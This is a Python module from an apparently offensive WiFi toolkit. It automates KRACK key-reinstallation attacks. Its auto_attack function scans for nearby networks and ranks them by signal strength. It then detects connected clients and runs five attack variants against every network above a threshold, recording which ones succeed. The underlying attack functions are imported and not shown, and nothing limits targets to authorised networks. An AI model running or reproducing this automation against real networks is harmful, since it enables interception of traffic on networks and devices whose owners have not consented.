from loguru import logger
import time
from .krack_core import parse_signal_strength
from .krack_network import scan_networks, detect_clients, sort_networks_by_strength
from .krack_attacks import (
    four_way_handshake_plaintext_retransmission,
    four_way_handshake_encrypted_retransmission,
    group_key_handshake_immediate_install,
    group_key_handshake_delayed_install,
    fast_bss_transition_attack
)

@logger.catch
def auto_attack(interface, min_signal=-70, attack_timeout=60, scan_interval=30, single_run=False):
    """
    Automatically scan for and attack networks based on signal strength.
    
    Args:
        interface (str): Network interface to use
        min_signal (int): Minimum signal strength to consider (in dBm)
        attack_timeout (int): Timeout for each attack attempt in seconds
        scan_interval (int): Time between network scans in seconds
        single_run (bool): If True, only run one scan cycle (for testing)
    
    Returns:
        dict: Dictionary of successful attacks by network
    """
    results = {}
    scan_count = 0
    max_scans = 4  # Maximum number of scan cycles for testing
    
    try:
        while scan_count < max_scans:
            try:
                # Scan for networks
                networks = scan_networks(interface)
                scan_count += 1
                
                if not networks:
                    if single_run:
                        break
                    time.sleep(scan_interval)
                    continue
                
                # Sort networks by signal strength
                networks.sort(key=lambda x: parse_signal_strength(x['Signal']), reverse=True)
                
                # Try to attack each network above minimum signal strength
                for network in networks:
                    signal = parse_signal_strength(network['Signal'])
                    if signal >= min_signal:
                        try:
                            # Try to detect clients
                            clients = detect_clients(interface, network['Address'], timeout=attack_timeout)
                            
                            if clients:
                                # Initialize results for this network if not exists
                                if network['Address'] not in results:
                                    results[network['Address']] = []
                                
                                # Attempt attacks with detected clients
                                for client in clients:
                                    try:
                                        # Attempt 4-way handshake attacks
                                        if four_way_handshake_plaintext_retransmission(interface, network['Address'], client):
                                            if 'four_way_handshake_plaintext' not in results[network['Address']]:
                                                results[network['Address']].append('four_way_handshake_plaintext')
                                    except (TimeoutError, Exception) as e:
                                        logger.error(f"Error during plaintext attack: {str(e)}")
                                        
                                    try:
                                        if four_way_handshake_encrypted_retransmission(interface, network['Address'], client):
                                            if 'four_way_handshake_encrypted' not in results[network['Address']]:
                                                results[network['Address']].append('four_way_handshake_encrypted')
                                    except (TimeoutError, Exception) as e:
                                        logger.error(f"Error during encrypted attack: {str(e)}")
                                    
                                    try:
                                        # Attempt group key attacks
                                        if group_key_handshake_immediate_install(interface, network['Address']):
                                            if 'group_key_handshake_immediate' not in results[network['Address']]:
                                                results[network['Address']].append('group_key_handshake_immediate')
                                    except (TimeoutError, Exception) as e:
                                        logger.error(f"Error during immediate group key attack: {str(e)}")
                                        
                                    try:
                                        if group_key_handshake_delayed_install(interface, network['Address']):
                                            if 'group_key_handshake_delayed' not in results[network['Address']]:
                                                results[network['Address']].append('group_key_handshake_delayed')
                                    except (TimeoutError, Exception) as e:
                                        logger.error(f"Error during delayed group key attack: {str(e)}")
                                    
                                    try:
                                        # Attempt fast BSS transition attack
                                        if fast_bss_transition_attack(interface, network['Address'], client):
                                            if 'fast_bss' not in results[network['Address']]:
                                                results[network['Address']].append('fast_bss')
                                    except (TimeoutError, Exception) as e:
                                        logger.error(f"Error during fast BSS attack: {str(e)}")
                        except Exception as e:
                            logger.error(f"Error attacking network {network['ESSID']}: {str(e)}")
                            continue
                
                if single_run:
                    break
                    
                time.sleep(scan_interval)
                
            except Exception as e:
                logger.error(f"Error during scan cycle: {str(e)}")
                if not single_run:
                    time.sleep(scan_interval)
                    continue
                break
            
    except KeyboardInterrupt:
        pass
    except Exception as e:
        logger.error(f"Error during auto attack: {str(e)}")
    
    return results